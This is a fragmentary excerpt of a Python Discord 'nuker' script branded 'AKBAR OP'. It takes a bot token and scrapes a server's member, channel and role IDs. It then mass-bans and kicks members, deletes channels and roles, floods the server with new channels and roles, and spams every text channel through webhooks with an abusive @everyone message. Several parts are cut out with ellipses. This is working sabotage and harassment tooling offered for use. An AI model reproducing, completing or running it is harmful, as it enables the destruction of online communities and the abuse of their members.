...
╚╝─╚╩╝╚═╩═══╩╝─╚╩╝╚═╝╚╝─╚═╩═══╩╝╚═╩═══╩╝╚═╝
''')
token = input(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Enter Token : {Fore.GREEN}')
...
class akbar:
        ...
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Banned {Fore.GREEN}{member.strip()} {Fore.GREEN}")
                    break
                else:
                    break
    ...
    def KickMembers(self, guild, member):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Banned {Fore.GREEN}{member.strip()}")
                    break
                else:
                    break
    ...
    def DeleteChannels(self, guild, channel):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
                    break
                else:
                    break
    ...
    def DeleteRoles(self, guild, role):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Role Deleted {Fore.GREEN}{role.strip()}")
                    break
                else:
                    break
    ...
    def SpamChannels(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Created Channel {Fore.GREEN}{name}")
                    break
                else:
                    break
    ...
    def SpamRoles(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Created Role {Fore.GREEN} {name}")
                    break
                else:
                    break
    ...
    def WebhookSend(self, webhook, message): #credits to anti
        while True:
            json = {
                'content': message if message != '' else "@everyone AKBAR OP HATERS LUND KI TOPI",
                'tts': False,
                'username': 'AKBAR PAPA OP'
            }
    ...
    async def SpamWebhook(self, guild_id, amount, message):
        ...
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='AKBAR PAPA OP', reason="AKBAR OP")
                print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Spammed")
    ...
    async def Scrape(self):
        guild = input(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Server Id: {Fore.GREEN}')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Akbar/members.txt")
            os.remove("Akbar/channels.txt")
            os.remove("Akbar/roles.txt")
        except:
            pass

        membercount = 0
        with open('Akbar/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Fore.GREEN}[AKBAR OP] {Fore.RED}Server has {Fore.GREEN}{membercount} Members")
            m.close()

        channelcount = 0
        with open('Akbar/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Scrapped {Fore.GREEN}{channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Akbar/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Scrapped {Fore.GREEN}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Server Id: {Fore.GREEN}')
        channel_name = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Channels Name: {Fore.GREEN}")
        channel_amount = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}How Many?: {Fore.GREEN}")
        role_name = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Roles Name: {Fore.GREEN}")
        role_amount = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}How Many?: {Fore.GREEN}")
        print()

        members = open('Akbar/members.txt')
        channels = open('Akbar/channels.txt')
        roles = open('Akbar/roles.txt')
    ...
    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Server Id: {Fore.GREEN}')
        name = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Role Name:: {Fore.GREEN}")
        amount = input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}How Many?: {Fore.GREEN}")
        print()
...
╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝ ╚═══════════════════════╝
        ''')
        choice = input(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Number: {Fore.GREEN}')
        if choice == '2': #bans
            ...
            amount = int(input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}How Many?: {Fore.GREEN}"))
            guild_id = int(input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Server Id: {Fore.GREEN}"))
            message = str(input(f"{Fore.GREEN}[AKBAR OP] {Fore.RED}Webhook Message: {Fore.GREEN}"))
    ...
    def Startup(self):
        try:
            ...
            print(f'{Fore.GREEN}[AKBAR OP] {Fore.RED}Token Was Invalid {Fore.GREEN}')
            input()
            os._exit(0)
